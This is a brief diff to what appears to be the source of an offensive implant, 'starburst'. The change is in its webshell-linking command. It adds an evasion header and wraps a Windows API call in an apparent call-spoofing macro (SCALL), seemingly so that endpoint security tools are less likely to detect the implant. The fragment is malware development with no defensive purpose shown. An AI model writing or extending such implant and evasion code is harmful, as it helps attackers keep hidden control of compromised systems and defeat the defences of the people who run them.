@@ -6,6 +6,7 @@
 #include <config.h>
 #include <strings.h>
 #include <base64.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_LINK_WEBSHELL
 
@@ -78,7 +79,7 @@ auto declfn starburst::cmd_link_webshell(
 
     memory::zero( link, sizeof( instance::WebshellLink ) );
     memory::copy( link->task_uuid, task_uuid, 36 );
-    link->link_id    = inst.kernel32.GetTickCount() & 0x7FFFFFFF;
+    link->link_id    = (DWORD)SCALL( inst, kernel32.GetTickCount ) & 0x7FFFFFFF;
     link->auth_method = auth_method;
 
     // copy URL
